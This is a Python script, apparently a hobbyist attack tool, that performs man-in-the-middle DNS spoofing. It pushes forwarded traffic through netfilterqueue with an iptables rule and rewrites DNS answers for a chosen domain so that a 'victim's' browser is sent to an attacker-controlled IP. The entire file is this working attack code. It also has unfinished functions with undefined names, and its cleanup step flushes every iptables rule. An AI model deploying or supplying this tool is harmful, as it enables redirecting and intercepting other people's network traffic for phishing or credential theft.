#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import subprocess
import sys
import argparse


packet_buffer = [] #a global var to store packets from queue for processing
udp_sequence_buffer = []

def run():
    set_iptables()
    create_queue()


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="the target string in the resource response")
    parser.add_argument("-d", "--destination", dest="destination", help="the destination IP address to send the victim's resource response to")
    arguments = parser.parse_args()
    if not arguments.target:
        parser.error("[-] please specify a target string")
    elif not arguments.destination:
        parser.error("[-] please specify a destination IP")
    else:
        return arguments


"""
function allows privaleged user to insert rule to FORWARD chain in iptables so that userspace target NFQUEUE sends packets to queue 0
"""


def set_iptables():
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for
                                                                                        # python 2.7 compatibility
    #subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for

    #subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # using call method for


"""
function removes rule inserted into iptables chain by privileged user
"""


def reset_iptables():
    subprocess.call(["iptables", "--flush"])


"""
creates object that passes packets from queue to callback function for further operations then forwards them
"""

def create_queue():
    print("Note to users due to modern browser security measures, target must be a HTTP address and not use HSTS, and destination must be a local webserver as such as Apache. Your victim's browser will not be able to connect to the destination if this is not the case")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, forge_response_packet)
    try:
        queue.run()
    except:
        print("[+] CTRL + C detected, resetting iptables")
        reset_iptables()
        sys.exit(0)


"""
function adds packets to udp_sequence_buffer if it detects that they are RR's to the attacker's QR, and not belonging to some othe QR. Presumably it will check things like source/ dest ip and port similar to wireshark

will add packet to some global udp_stream_buffer list if a matching 5-tuple is found inside of the global DNS buffer
"""
#def detect_udp_stream(packet):
#    return None
    


"""
function puts details from victim's QR into attacker's RR response containing the rdata which is from the attacker's RR

drops victim RR packets before the substitution occurs

:args victim_question: the packet containing the victim's initial QR
:args attacker_stream: the queue containing the attacker's packets which contain the RR layers
"""

def forge_question_packet(packet):
    print_response(packet)
    scapy_packet = scapy.IP(packet.get_payload())
    if (scapy_packet.haslayer(scapy.DNSQR) and not scapy_packet.haslayer(scapy.DNSRR)):
        if "tachibana" in scapy_packet[scapy.DNSQR].qname:
            scapy_packet[scapy.DNSQR].qname = "www.vulnweb.com"
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
            print("QUESTION RESPONSE PACKET")
            print("\n")
            print(scapy_packet.show())
    packet.accept()


def forge_response_packet(packet):
    arguments = get_args()
    print_question(packet) 
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        if arguments.target in scapy_packet[scapy.DNSRR].rrname:
            answer = scapy.DNSRR(rrname="", rdata=str(arguments.destination))
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
            print("RESOURCE RESPONSE PACKET")
            print("\n")
            print(scapy_packet.show())
    packet.accept()


def print_question(packet):
    arguments = get_args()
    scapy_packet = scapy.IP(packet.get_payload())
    if (scapy_packet.haslayer(scapy.DNSQR) and not scapy_packet.haslayer(scapy.DNSRR)):
        if arguments.target in scapy_packet[scapy.DNSQR].qname:
            print("QUESTION RECORD PACKET")
            print("\n")
            print(scapy_packet.show())


def forge_response_packet_unused(packet):
    #return list of packets to br processed
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):    
        #template for packet forging
        if "tachibana" in qname: # victim question check
            print(scapy_packet[scapy.DNSQR].show())
            print(scapy_packet[scapy.UDP].show())
            answer = scapy.DNSRR(rrname="plus.l.google.com", rdata="172.217.167.68")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            #packet.set_payload(str(scapy_packet))

    packet.accept()

run()
